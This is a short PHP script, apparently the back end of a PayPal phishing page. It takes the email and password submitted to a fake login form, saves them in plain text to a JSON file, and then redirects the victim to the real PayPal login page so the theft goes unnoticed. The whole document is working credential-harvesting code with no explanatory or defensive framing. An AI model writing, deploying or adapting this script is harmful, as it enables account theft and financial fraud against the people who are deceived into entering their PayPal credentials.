<?php
$user = $_POST['login_email'];
$pass = $_POST['login_password'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);
$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);
header('Location: https://www.paypal.com/login');
exit();
